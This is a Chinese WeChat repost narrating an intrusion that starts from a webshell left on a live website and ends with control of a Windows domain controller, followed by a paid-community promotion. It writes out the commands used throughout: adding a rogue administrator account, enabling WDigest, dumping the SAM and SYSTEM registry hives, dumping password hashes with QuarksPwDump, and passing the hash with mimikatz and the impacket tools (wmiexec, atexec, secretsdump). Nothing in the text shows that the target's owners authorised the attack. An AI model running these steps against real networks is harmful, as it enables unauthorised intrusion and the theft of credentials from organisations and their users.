---
title: webshell到域控
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247494593&idx=1&sn=d13d5e032650c040018c74feb7a49aee&chksm=e8a5e1a2dfd268b47eb5cff0b2cd52eece6092e713c6fcde78fd1f8f9ed45d338cb08808cf86&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-05-12
fetch_date: 2025-10-06T17:17:22.096144
---

# webshell到域控

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lI49N6icyPu9lprDzaU2TBTwwLicfOL6kbL3fhiaqGPfxLUI5lteRsk42Q/0?wx_fmt=jpeg)

# webshell到域控

迪哥讲事

以下文章来源于yudays实验室
，作者yudays

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7sPEUKMpk4lowa1VN2eBSX9O1sfup6GghZDGJzRYwygQ/0)

**yudays实验室**
.

安全相关与攻防实战分享

欢迎转发，请勿抄袭

        分享一次与同事的实战经历

一、前言

    同事发来一个url，发现该站点存在任意文件读取，并被人留下了webshell，直接连接就行了。开局就是webshell![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5l6ibGOicHgfYVzsN54BficO9ibkwAltEzic3D9DiaHn02B9DFBvs6Ddbwam0g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5l762iaTpialuBZicP7V8H7aXMprmib9NCuQqibrqLNicdcNJeTHoMdE3UPGxQ/640?wx_fmt=png)

二、机器信息收集

    1、连接webshell后，发现当前是一个域管理员权限。

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5ltLkC8yGqs5csia51ciaQqC9tWtIhlmnrHpDoMdUop2IgzKzSGYjPEibNQ/640?wx_fmt=png)

    2、目标存在域

```
net time /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lQFokhWIRqd1OqqhqIPTP80rkAYWEFw7LJ6DDIusTibPzszKXaDkxkVg/640?wx_fmt=png)

     3、存在杀软

```
tasklist /svc
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lOJxWBDo49qq0KU2tjvRvWVbrRiaH9SA1rVbj61YrMqqSAY4nNCfA07Q/640?wx_fmt=png)

三、失败的远程桌面登陆

        1、直接通过终端，添加用户。并添加到管理组。

```
net user user passwd /addnet localgroup administrators user /add
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lV5xOibg7Op6u8LSTJ1yxcicuyY7mGha4ia6rqzNT7fWzCqibPOxw63Ucew/640?wx_fmt=png)

        2、发现远程默认端口被改。

```
执行命令 tasklist /svc | find "Ter"，本例中查看到 TermService 的 PID 是 1592。执行命令 netstat -ano | find "xxx"，查看 TermService 使用的端口，如示例中的 3389。
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lrfD3icib3lyOxXS2JiazJMx75cfwkwtGrtg6vWDiaZzOZGdRZicyhjeayhg/640?wx_fmt=png)

        3、尝试连接发现连接一直连接不上。

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lsOJuQNJOe5EaYI7qVGc63Ir02dpJaq8gbdFtG6CFEJd0gaFVnpiaPmQ/640?wx_fmt=png)

        4、尝试wmiexec登陆

```
python wmiexec.py user:passwd@ip
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lDHOysRGwfmG10ClyF4VLGd0F4riafvRVXJwjhibUw4tQdXdo05ZFrhZQ/640?wx_fmt=png)

四、奇怪的用户文件夹

    1、通过查看用户列表，发现一共7个本地用户。

```
net user
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lOia6icXO3icVHtP1h9NFxEJq1IdqpjZ98iaJVotS2c1FxalKLp2SU1ykhg/640?wx_fmt=png)

    2、与之对应的用户配置文件却只有2个。

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lZ8s8ejic0mqVYSE6ib8awI1TRo4ia1VGQYkP74PS5pDzqgce1E9MWKbFw/640?wx_fmt=png)

五、凭证收集

    1、尝试本地凭证导出

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /freg save hklm\sam e:\test\sam.hivereg save hklm\system e:\test\system.hive
```

    失败！

    2、上传各种内存凭证导出工具，均以失败告终！

六、不起眼的提示

    1、将本地凭证导出工具上传到c盘时的提示

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lhDMvums1pa8AXUiaRSUZRDZhTgs4ggf6flNJbz1oT8Mj2rgBibB8SqgA/640?wx_fmt=png)

        那么可以判断出，前面用户登陆不了远程桌面的问题跟这个有关，于是将一些多年前且无用的文件清理。

七、再次导出本地凭证

    1、上传工具quarkpwdump.exe。通过终端命令执行导出。

```
QuarksPwDump.exe  --dump-hash-local
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5l09NI1nk7I08tyT5UPDeN4z8duBichzzpLOb5myDohW8JBicRqN6AgYXQ/640?wx_fmt=png)

    2、通过ntlm登陆远程桌面

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /fprivilege::debugsekurlsa::pth /user:administrator /domain:. /ntlm:ntlm值 "/run:mstsc.exe /restrictedadmin
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lKNkckiaEMWw3bh5kmTbgxPBzZamH7eGpdic7JIuaqfI4NT8nMB16lP4w/640?wx_fmt=png)

3、上线cs，导出内存凭证

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lAgjjRgMa5VPnathOTeRh08sXhdQoKV8xKq1yNqsxchwnFibl9eHJX7g/640?wx_fmt=png)

4、验证域管hash

```
atexec.exe -hashes :ntlm 域/域管用户名@ip whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lOCIrgNuLeicFM2xBibd1ZDJjKN4kZyR57OS3mTbH9aI3bIDBxYYVZB8Q/640?wx_fmt=png)

八、进击域控

1、寻找域控ip地址

```
net group "domain controllers" /domain 查找域管理器，再ping即可得到域控ip
```

2、使用smb管道登陆

```
python3 wmiexec.py -hashes :ntlm 域名称/administrator@域控ip
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmllGlMjicd9t8Lyib9SUnvZh9h4YKu0dFvaZhGl1bhEcRr1yOxYsCta4UjBYEvQLq790ONP5VPRsNQ/640?wx_fmt=png)

发现登陆失败，猜测杀软拦截了。

3、尝试将ntlm解密，奈何解不了。

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmllGlMjicd9t8Lyib9SUnvZh6wMm7Siatq916mF4AUeIlavT5eTR7vHPsonmZ2ibpZPHiaCAkGvBUuVAA/640?wx_fmt=png)

4、尝试导出所有的hash

```
python3 secretsdump.py -hashes :ntlm 域名称/administrator@域控ip -dc-ip 域控ip
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lbLUXnXO3eIvVIMarP1FdXpduqxb3dgibicvhjmHSnxicVAQ91jiavFKEBw/640?wx_fmt=png)

5、找到域管用户

```
net group "domain admins" /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5lsiaQdaNRI0SCf7oV0I5Ylba8oSLpKuicOvZGkz7Gx31jZz0sUtNIBCug/640?wx_fmt=png)

6、将这三个域管用户ntlm进行解密，最终解出一个，登陆域控。

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXmkjZ5DcG58aTrmfWoibFe5libu1fetM2KsnrQDpmPzZwhuRRQHTj3036nPMCYTFOdXvCuQQo1icG1kg/640?wx_fmt=png)

总结：开局就是webshell。

文章声明：文章涉及到的工具、及教程仅供学习参考，请勿非法使用。否则与作者无关！

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过